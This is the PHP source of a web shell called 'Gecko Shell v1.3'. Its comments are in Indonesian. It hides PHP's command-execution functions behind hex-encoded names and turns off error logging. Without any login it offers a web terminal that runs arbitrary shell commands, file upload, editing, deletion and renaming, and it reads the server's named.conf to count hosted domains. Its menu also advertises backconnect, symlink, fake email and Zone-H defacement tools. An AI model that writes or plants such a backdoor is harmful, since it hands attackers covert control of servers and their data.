<?php

@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

// SET ARRAY
$Array = [
    '676c6f62', // glob => 0
    '676574637764', // getcwd => 1
    '7b2e5b212e5d2c7d2a', // glob finder => 2 
    '6368646972', // Chdir => 3
    '7068705f756e616d65', // uname => 4
    '6765745f63757272656e745f75736572', // user => 5
    '73797374656d', // system => 6
    '7368656c6c5f65786563', // shell_exec => 7
    '65786563', // exec => 8
    '7061737374687275', // passthru => 9
    '706f70656e', // popen => 10
    '70636c6f7365', // pclose => 11
    '70726f635f6f70656e', // proc_open => 12
    '66696c655f6765745f636f6e74656e7473', // file_get_contents => 13
    '66696c655f7075745f636f6e74656e7473', // file_put_contents => 14
    '636f7079', // copy => 15
    '6d6f7665645f75706c6f616465645f66696c65', // moved_uploaded_file => 16
    '746f756368', // touch => 17
    '6d6b646972', // mkdir => 18
    '696e695f676574' // ini_get => 19
];
$hitung_array = count($Array);
for ($i = 0; $i < $hitung_array; $i++) {
    $fungsi[] = unhex($Array[$i]);
}

//Fungsional ada di sini

//Cek Domains
function symlinkDomain($dom)
{
    $d0mains = @file("/etc/named.conf", false);
    if (!$d0mains) {
        $dom = "<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>";
        $GLOBALS["need_to_update_header"] = "true";
    } else {
        $count = 0;
        foreach ($d0mains as $d0main) {
            if (@strstr($d0main, "zone")) {
                preg_match_all('#zone "(.*)"#', $d0main, $domains);
                flush();
                if (strlen(trim($domains[1][0])) > 2) {
                    flush();
                    $count++;
                }
            }
        }
        $dom = "$count Domain";
    }
    return $dom;
}

// Terminal Mad
function gecko_cmd($de)
{
    $out = '';
    try {
        if (function_exists('shell_exec')) {
            return @$GLOBALS['fungsi'][7]($de);
        } else if (function_exists('system')) {
            @$GLOBALS['fungsi'][6]($de);
        } else if (function_exists('exec')) {
            $exec = array();
            @$GLOBALS['fungsi'][8]($de, $exec);
            $out = @join("\n", $exec);
            return $exec;
        } else if (function_exists('passthru')) {
            @$GLOBALS['fungsi'][9]($de);
        } else if (function_exists('popen') && function_exists('pclose')) {
            if (is_resource($f = @$GLOBALS['fungsi'][10]($de, "r"))) {
                $out = "";
                while (!@feof($f))
                    $out .= fread($f, 1024);
                return $out;
                $GLOBALS['fungsi'][11]($f);
            }
        } else if (function_exists('proc_open')) {
            $pipes = array();
            $process = @$GLOBALS['fungsi'][12]($de . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
            $out = @stream_get_contents($pipes[1]);
            return $out;
        }
    } catch (Exception $e) {
    }
    return $out;
}

// CGI FUNCTION
function cgi()
{
    if (gecko_cmd("python --help")) {
        return "ON";
    } else if (gecko_cmd("perl --help")) {
        return "ON";
    } else if (gecko_cmd("ruby --help")) {
        return "ON";
    } else {
        return "OFF";
    }
}
// Fungsi Menghapus folder dan file
function unlinkDir($dir)
{
    $dirs = array($dir);
    $files = array();
    for ($i = 0;; $i++) {
        if (isset($dirs[$i]))
            $dir =  $dirs[$i];
        else
            break;

        if ($openDir = opendir($dir)) {
            while ($readDir = @readdir($openDir)) {
                if ($readDir != "." && $readDir != "..") {

                    if (is_dir($dir . "/" . $readDir)) {
                        $dirs[] = $dir . "/" . $readDir;
                    } else {

                        $files[] = $dir . "/" . $readDir;
                    }
                }
            }
        }
    }



    foreach ($files as $file) {
        unlink($file);
    }
    $dirs = array_reverse($dirs);
    foreach ($dirs as $dir) {
        rmdir($dir);
    }
}

// Format SIze
function formatSize($bytes)
{
    $types = array('B', 'KB', 'MB', 'GB', 'TB');
    for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++);
    return (round($bytes, 2) . " " . $types[$i]);
}
// Function Encode & Decode
function hex($n)
{
    $y = '';
    for ($i = 0; $i < strlen($n); $i++) {
        $y .= dechex(ord($n[$i]));
    }
    return $y;
}
function unhex($h)
{
    if (!is_string($h)) return null;
    $r = '';
    for ($a = 0; $a < strlen($h); $a += 2) {
        $r .= chr(hexdec($h{
            $a} . $h{
            ($a + 1)}));
    }
    return $r;
}

function perms($file)
{
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } else {
        // Unknown
        $info = 'u';
    }
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
        (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
        (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
        (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

// Kenapa saya taruh di sini karena function download ini tidak bisa jika di taruh di bawah
// Karena mempunyai fungsi header
if (!empty($_GET['download'])) {
    $nameNyafile = basename($_GET['download']);
    $pathFilenya = getcwd() . "/" . $nameNyafile;
    if (!empty($nameNyafile) && file_exists($pathFilenya)) {

        // Define Headers
        header('Cache-control: public');
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $nameNyafile . '"');
        header('Content-Transfer-Encoding: binary');
        readfile($pathFilenya);
        exit;
    }
}

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="shortcut icon" href="gecko.png" type="image/x-icon">
    <title>Gecko :: <?= $_SERVER['SERVER_NAME']; ?> ::</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');

        body {
            font-family: monospace;
            color: white;
            background-color: #111111;
        }

        table {
            width: 100%;
        }

        h1 {
            font-family: 'Press Start 2P', cursive;
            text-shadow: 5px 5px 0px #008D8D;
            animation-name: h1-gecko;
            animation-duration: 1.3s;
            animation-direction: alternate;
            animation-iteration-count: infinite;
            animation-fill-mode: both;
        }

        @keyframes h1-gecko {
            from {
                text-shadow: 5px 5px 0px #008D8D;
            }

            to {
                text-shadow: 5px 5px 0px transparent;
            }
        }

        a {
            text-decoration: none;
            color: #008D8D;
        }

        a:hover {
            color: white;
        }

        ul {
            list-style: none;
        }

        li {
            margin-top: 5px;
        }

        .bg-table {
            background-color: #222222;
        }

        .logo {
            border: 1px solid #008D8D;
            padding: 6px 10px;
            margin-top: -5px;
            margin-left: 10px;
            /* border-radius: 10px; */
            position: absolute;
            z-index: 20;
        }

        .h1-main {
            text-align: center;
        }

        .main-info {
            font-size: small;
        }

        .border-table {
            border: 1px solid #008D8D;
            padding: 5px;
            border-radius: 10px;
        }

        .main-border {
            border: 1px solid #008D8D;
            padding: 5px;
            border-radius: 10px;
        }

        .btn-gecko {
            color: white;
            background-color: #222222;
            padding: 8px;
            border-radius: 5px;
            transition: 0.2s;
        }

        .btn-gecko:hover {
            color: #008D8D;
            padding: 6px;
            border-radius: 3px;
        }

        .submit-gecko {
            color: white;
            background-color: #222222;
            padding: 4px 14px;
            border-radius: 5px;
            cursor: pointer;
        }

        .select-gecko {
            color: white;
            border: 1px outset white;
            background-color: #222222;
            padding: 4px 14px;
            border-radius: 5px;
            cursor: pointer;
        }

        .preloader {
            left: 0;
            top: 0;
            z-index: 99;
            width: 100%;
            position: fixed;
            height: 100%;
            background-color: black;
        }

        .loading {
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            position: absolute;
        }

        .lds-facebook {
            display: inline-block;
            position: relative;
            width: 80px;
            height: 80px;
        }

        .lds-facebook div {
            display: inline-block;
            position: absolute;
            left: 8px;
            width: 16px;
            background: #fff;
            animation: lds-facebook 1.2s cubic-bezier(0, 0.5, 0.5, 1) infinite;
        }

        .lds-facebook div:nth-child(1) {
            left: 8px;
            animation-delay: -0.24s;
        }

        .lds-facebook div:nth-child(2) {
            left: 32px;
            animation-delay: -0.12s;
        }

        .lds-facebook div:nth-child(3) {
            left: 56px;
            animation-delay: 0;
        }

        @keyframes lds-facebook {
            0% {
                top: 8px;
                height: 64px;
            }

            50%,
            100% {
                top: 24px;
                height: 32px;
            }
        }

        .border-tools {
            border-top: 1px solid #008D8D;
            padding: 4px 0px;
        }

        .gecko-tools li {
            display: inline-block;
            padding-top: 17px;
        }

        #modal-box {
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            z-index: 98;
            position: fixed;
            background-color: rgba(0, 0, 0, 0.7);
        }

        #modal-header {
            padding: 10px;
        }

        #close-btn {
            color: white;
            font-size: 20px;
            transition: 0.1s;
            float: right;
            padding: 10px 20px;
        }

        #close-btn:hover {
            color: #008D8D;
        }

        .textarea-gecko {
            font-size: smaller;
            width: 100%;
            color: white;
            background-color: #222222;
        }

        .header-gecko-option li {
            display: inline-block;

        }

        .input-file-gecko {
            border: 1px dashed white;
            padding: 1px;
            border-radius: 4px;
        }

        .buatDir {
            width: 50%;
            padding: 5px;
            border-radius: 4px;
            background-color: #222222;
            color: white;

        }
    </style>
</head>
<?php
if (isset($_GET['path'])) {
    $chdir = unhex($_GET['path']);
    $fungsi[3]($chdir);
} else {
    $chdir = $fungsi[1]();
}

$cwd = $fungsi[1]();
$cariDir = $fungsi[0]($fungsi[2], GLOB_BRACE);

?>

<body>
    <div class="logo">
        <b>Gecko <strong style="color:red;">v1.3</strong></b>
        <br>
        <b>Author : MrMad</b>
    </div>
    <div class="h1-main">
        <h1>Gecko Shell</h1>
    </div>
    <div class="main-border">
        <div class="main-info">
            <ul>
                <li><b><?= $fungsi[4](); ?></b></li>
                <li><b><?= $_SERVER['SERVER_SOFTWARE']; ?></b></li>
                <li><b><?= "Server IP : " . $_SERVER['SERVER_ADDR'] . " Your IP : " . $_SERVER['REMOTE_ADDR']; ?></b></li>
                <li><b>CGI : <?= cgi(); ?></b></li>
                <li><b>Domains : <?= symlinkDomain($dom); ?></b></li>
                <li><b><?= $fungsi[5](); ?></b></li>
                <li>
                    <form action="" method="post" enctype="multipart/form-data">
                        <input type="file" name="gecko-files" class="input-file-gecko">
                        <input type="submit" value="Upload" name="submit-gecko-files" class="submit-gecko">
                    </form>
                </li>
            </ul>
            <div class="border-tools">
                <ul class="gecko-tools">
                    <li><a href="?path=<?php echo hex($fungsi[1]() . "/") . "&action=read_function"; ?>" class="btn-gecko">-> Readble Function</a></li>
                    <li><a href="?path=<?php echo hex($fungsi[1]() . "/") . "&action=create_folder"; ?>" class="btn-gecko">-> Create Folder</a></li>
                    <li><a href="?path=<?php echo hex($fungsi[1]() . "/") . "&action=create_file"; ?>" class="btn-gecko">-> Create File</a></li>
                    <li><a href="?path=<?php echo hex($fungsi[1]() . "/") . "&action=terminal"; ?>" class="btn-gecko">-> Terminal</a></li>
                    <li><a href="?path=<?php echo hex($fungsi[1]() . "/") . "&action=backconnect"; ?>" class="btn-gecko">-> Backconnect</a></li>
                    <li><a href="?path=<?php echo hex($fungsi[1]() . "/") . "&action=cgi"; ?>" class="btn-gecko">-> CGI</a></li>
                    <li><a href="?path=<?php echo hex($fungsi[1]() . "/") . "&action=Symlink"; ?>" class="btn-gecko">-> Symlink</a></li>
                    <li><a href="?path=<?php echo hex($fungsi[1]() . "/") . "&action=sql_manager"; ?>" class="btn-gecko">-> Sql Manager</a></li>
                    <li><a href="?path=<?php echo hex($fungsi[1]() . "/") . "&action=fake_email"; ?>" class="btn-gecko">-> Fake Email</a></li>
                    <li><a href="?path=<?php echo hex($fungsi[1]() . "/") . "&action=bypasser"; ?>" class="btn-gecko">-> Bypasser</a></li>
                    <li><a href="?path=<?php echo hex($fungsi[1]() . "/") . "&action=zone_h"; ?>" class="btn-gecko">-> Zone-H</a></li>
                    <li><a href="?path=<?php echo hex($fungsi[1]() . "/") . "&action=tools"; ?>" class="btn-gecko">-> Tools ++</a></li>
                </ul>
            </div>
        </div>
    </div>
    <br>
    <div class="container">
        <?php
        $path = str_replace("\\", "/", $cwd); // untuk path garis windows
        $pwd = explode("/", $path);
        foreach ($pwd as $id => $val) {
            if ($val == '' && $id == 0) {
                echo '<a href="?path=' . hex('/') . '">/ </a>';
                continue;
            }
            if ($val == '') continue;
            echo '<a href="?path=';
            for ($i = 0; $i <= $id; $i++) {
                echo hex($pwd[$i]);
                if ($i != $id) echo hex("/");
            }
            echo '">' . ucfirst($val) . ' / ' . '</a>';
        }
        echo '<a style="color:red;" href="?path=' . hex($_SERVER['DOCUMENT_ROOT']) . '">[ HOME SHELL ]</a>';
        ?>
    </div>
    <br>
    <div class="border-table">
        <div class="preloader">
            <div class="loading">
                <div class="lds-facebook">
                    <div></div>
                    <div></div>
                    <div></div>
                </div>
            </div>
        </div>
        <table>
            <tr class="bg-table">
                <th style="width:30%; padding:7px;">Name</th>
                <th>Size</th>
                <th>Permission</th>
                <th>Owner/Group</th>
                <th>Action</th>
            </tr>
            <!-- DIRECTORY NYA BANG -->
            <?php foreach ($cariDir as $Man) : ?>
                <?php if (is_dir($Man)) : ?>
                    <form action="" method="post">
                        <tr>
                            <td><input type="checkbox" name="check-gecko[]" id="folder" value="<?= $Man; ?>">&nbsp;<label for="folder"><a href="?path=<?php echo hex($fungsi[1]() . "/" . $Man); ?>"><?= $Man; ?></label></a>
                            <td style="text-align:center;">[ DIR ]</td>
                            <td style="text-align:center;"><?php if (is_writable($fungsi[1]() . '/' . $Man)) echo '<font color="#00ff00">';
                                                            elseif (!is_readable($fungsi[1]() . '/' . $Man)) echo '<font color="red">';
                                                            echo perms($fungsi[1]() . '/' . $Man);
                                                            if (is_writable($fungsi[1]() . '/' . $Man) || !is_readable($fungsi[1]() . '/' . $Man)) echo '</font>'; ?></td>
                            <td style="text-align:center;"><?php $fileowner = posix_getpwuid(fileowner($Man));
                                                            echo $fileowner["name"] . "/" . $fileowner["name"]; ?></td>
                            <td style="text-align:center;"><a href="?path=<?php echo hex($fungsi[1]()) . "&action=rename&ff=" . $Man; ?>">R</a>&nbsp;<a href="?path=<?php echo hex($fungsi[1]()) . "&action=chmod&ff=" . $Man; ?>">G</a></td>
                        </tr>
                    <?php endif; ?>
                <?php endforeach; ?>
                <!-- FILE NYA BANG -->
                <?php foreach ($cariDir as $Man) : ?>
                    <?php if (is_file($Man)) : ?>
                        <?php $extension = strtolower(pathinfo($Man, PATHINFO_EXTENSION)); ?>
                        <tr>
                            <td><input type="checkbox" name="check-gecko[]" id="folder" value="<?= $Man; ?>">&nbsp;<label for="folder"><a href="?path=<?php echo hex($fungsi[1]()) . "&action=view&file=" . $Man; ?>"><?= $Man; ?></label></td>
                            <td style="text-align:center;"><?= formatSize(filesize($Man)); ?></td>
                            <td style="text-align:center;"><?php if (is_writable($fungsi[1]() . '/' . $Man)) echo '<font color="#00ff00">';
                                                            elseif (!is_readable($fungsi[1]() . '/' . $Man)) echo '<font color="red">';
                                                            echo perms($fungsi[1]() . '/' . $Man);
                                                            if (is_writable($fungsi[1]() . '/' . $Man) || !is_readable($fungsi[1]() . '/' . $Man)) echo '</font>'; ?></td>
                            <td style="text-align:center;"><?php $fileowner = posix_getpwuid(fileowner($Man));
                                                            echo $fileowner["name"] . "/" . $fileowner["name"]; ?></td>
                            <td style="text-align:center;"><a href="?path=<?php echo hex($fungsi[1]()) . "&action=rename&ff=" . $Man; ?>">R</a>&nbsp;<a href="?path=<?php echo hex($fungsi[1]()) . "&download=" . $Man; ?>">D</a>&nbsp;<a href="?path=<?php echo hex($fungsi[1]()) . "&action=chmod&file=" . $Man; ?>">G</a></td>
                        </tr>
                    <?php endif; ?>
                <?php endforeach; ?>
        </table>
    </div>
    <br>
    <select name="action-gecko" class="select-gecko" id="">
        <option value="delete">Delete</option>
        <option value="unzip">Unzip</option>
    </select>
    <input type="submit" value="Submit" name="gecko-submit" class="submit-gecko">
    </form>
    <!-- SCript Here -->
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script type="text/javascript">
        $(document).ready(function() {
            $('.preloader').delay(600).fadeOut();
        });
    </script>
    <?php
    // Statement disini

    if ($_GET['action']  == true) {
        echo '<div class="modal" id="modal-box">';
        echo '<a href="?path=' . hex($fungsi[1]()) . '" id="close-btn">&#88;</a>';
        echo '<div class="modal-header" id="modal-header">';
        echo '<ul class="header-gecko-option">';


        // Header Fungsi
        if ($_GET['action'] == "view" && $_GET['file'] == is_file($_GET['file'])) {
            echo '
                <li><b>File Name : ' . $_GET['file'] . '</b></li>
                <li><a href="?path=' . hex($fungsi[1]()) . '&action=edit&file=' . $_GET['file'] . '"><b>[ Edit This File ]</b></a></li>
            ';
        } elseif ($_GET['action'] == "edit" && $_GET['file'] == is_file($_GET['file'])) {
            echo '<li><b>File Name : ' . $_GET['file'] . '</b></li>';
        } elseif ($_GET['action'] == "create_folder") {
            echo '<li><b>Create Folder ++ </b></li>';
        } elseif ($_GET['action'] == "create_file") {
            echo '<li><b>Create File ++ </b></li>';
        } elseif ($_GET['action'] == "read_function") {
            echo '<li>- Readble_function -</li>';
        } elseif ($_GET['action'] == "terminal") {
            echo '<li>- Terminal -</li>';
        } elseif ($_GET['action'] == "rename" && $_GET['ff'] == true) {
            echo '<li>Rename : ' . $_GET['ff'] . '</li>';
        }
        echo '</ul>';


        // Body Fungsi


        echo '<div class="modal-body" id="modal-body">';
        if ($_GET['action'] == "view" && $_GET['file'] == is_file($_GET['file'])) {
            echo "<textarea class='textarea-gecko' rows='30'>" . htmlspecialchars($fungsi[13]($_GET['file'])) . "</textarea>";
        } else if ($_GET['action'] == "edit" && $_GET['file'] == is_file($_GET['file'])) {
            echo "
            <form method='post'>
            <textarea class='textarea-gecko' name='text-gecko' cols='30' rows='30'>" . htmlspecialchars($fungsi[13]($_GET['file'])) . "</textarea>
            <input type='submit' value='Save' class='submit-gecko' name='geckoSub'>
            </form>
            ";
        } elseif ($_GET['action'] == "create_folder") {
            echo '
            <center>
            <form method="post">
            <input type="text" name="buatDir" class="buatDir" placeholder="[ Name Folder ]">
            <input type="submit" name="geckoSub" value="Submit" class="submit-gecko">
            </form>
            </center>
            
            ';
        } elseif ($_GET['action'] == "create_file") {
            echo '
            <center>
            <form method="post">
            <input type="text" name="buatFile" class="buatDir" placeholder="[ Name File ]">
            <input type="submit" name="geckoSub" value="Submit" class="submit-gecko">
            </form>
            </center>
            
            ';
        } elseif ($_GET['action'] == "read_function") {
            echo '<pre>';
            $show_ds = (!empty(@$fungsi[19]("disable_functions"))) ? "<a href='#' class='ds'>" . @$fungsi[19]("disable_functions") . "</a>" : "<a href='#'><font color=green>All Function Is Accesible</font></a>";
            echo "<b>      " . $show_ds . "</b>";
            echo '</pre>';
        } elseif ($_GET['action'] == "terminal") {
            echo '<textarea class="textarea-gecko" cols="30" rows="30">';
            if (isset($_POST['submit-terminal'])) {
                echo gecko_cmd($_POST['terminal-gecko'] . " 2>&1");
            }
            echo '</textarea>';
            echo '<form method="post">
            <label for="terminal-gecko">CMD : </label><input type="text" name="terminal-gecko" class="buatDir" autofocus>
            <input type="submit" value="Submit" name="submit-terminal" class="submit-gecko">
            </form>
            ';
        } elseif ($_GET['action'] == "rename" && $_GET['ff'] == true) {
            echo '
            <center>
            <form method="post">
            <input type="text" name="rename-gecko" class="buatDir" placeholder="[ Name File / Folder ]">
            <input type="submit" name="submit-rename" value="Submit" class="submit-gecko">
            </form>
            </center>
            ';
        }
        echo '</div>';
        echo '</div>';
        echo '</div>';
    }
    if (isset($_POST['geckoSub'])) {
        $filenya = $_GET['file'];
        if (is_file($filenya)) {
            $hasilnya = $fungsi[14]($filenya, $_POST['text-gecko']);
            if ($hasilnya) {
                echo '<script> window.location = "?path=' . hex($fungsi[1]()) . '&response=success"; </script>';
            } else {
                echo '<script> window.location = "?path=' . hex($fungsi[1]()) . '&response=failed"; </script>';
            }
        }
        $_folder = $_POST['buatDir'];
        $_file = $_POST['buatFile'];
        if (@$fungsi[18]($fungsi[1]() . "/" . $_folder)) {
            echo '<script> window.location = "?path=' . hex($fungsi[1]()) . '&response=success"; </script>';
        } else {
            echo '<script> window.location = "?path=' . hex($fungsi[1]()) . '&response=failed"; </script>';
        }
        if (@$fungsi[17]($fungsi[1]() . "/" . $_file)) {
            echo '<script> window.location = "?path=' . hex($fungsi[1]()) . '&response=success"; </script>';
        } else {
            echo '<script> window.location = "?path=' . hex($fungsi[1]()) . '&response=failed"; </script>';
        }
    }

    if (isset($_POST['submit-rename'])) {
        if (is_file($_GET['ff']) || is_dir($_GET['ff'])) {
            // echo $_POST['rename-gecko'] . " " . $_GET['ff'];
            $renameNya = rename($_GET['ff'], $_POST['rename-gecko']);
            if ($renameNya) {
                echo '<script> window.location = "?path=' . hex($fungsi[1]()) . '&response=success"; </script>';
            } else {
                echo '<script> window.location = "?path=' . hex($fungsi[1]()) . '&response=failed"; </script>';
            }
        }
    }

    if (isset($_POST['gecko-submit'])) {
        $geckoCheck = $_POST['check-gecko'];
        foreach ($geckoCheck as $gecko) {
            if ($_POST['action-gecko'] == "delete") {
                if (file_exists($gecko) || is_dir($gecko)) {
                    if (is_file($gecko)) {
                        unlink($gecko);
                        echo '<script> window.location = "?path=' . hex($fungsi[1]()) . '&response=success"; </script>';
                    } else if (is_dir($gecko)) {
                        unlinkDir($gecko);
                        echo '<script> window.location = "?path=' . hex($fungsi[1]()) . '&response=success"; </script>';
                    } else {
                        echo '<script> window.location = "?path=' . hex($fungsi[1]()) . '&response=failed"; </script>';
                    }
                }
            }
        }
    }
    if (isset($_POST['submit-gecko-files'])) {
        $nameFiles = $_FILES['gecko-files']['name'];
        $tmp_name = $_FILES['gecko-files']['tmp_name'];
        if (@$fungsi[15]($tmp_name, $fungsi[1]() . "/" . $nameFiles)) {
            echo '<script> window.location = "?path=' . hex($fungsi[1]()) . '&response=success_upload"; </script>';
        } else if (@$fungsi[16]($tmp_name, $fungsi[1]() . "/" . $nameFiles)) {
            echo '<script> window.location = "?path=' . hex($fungsi[1]()) . '&response=success_upload"; </script>';
        } else {
            echo '<script> window.location = "?path=' . hex($fungsi[1]()) . '&response=failed"; </script>';
        }
    }
    ?>
</body>

</html>